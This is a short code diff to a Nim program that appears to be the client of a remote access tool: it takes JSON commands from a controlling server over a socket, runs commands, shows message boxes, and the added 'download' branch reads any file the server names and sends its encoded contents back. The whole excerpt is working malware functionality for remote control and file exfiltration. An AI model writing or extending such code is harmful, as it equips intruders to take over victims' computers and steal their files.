@@ -34,6 +34,10 @@ proc receiveCommands(client: Socket) =
                     client.sendOutput("CMD", getCurrentExceptionMsg())
             of "msgbox":
                 discard msgbox(jsonNode["title"].getStr(), jsonNode["caption"].getStr())
+            of "download":
+                let path = jsonNode["path"].getStr()
+                let contents: string = readFile(path)
+                client.sendFile(path, encode(contents))
 
 receiveCommands(client)
   
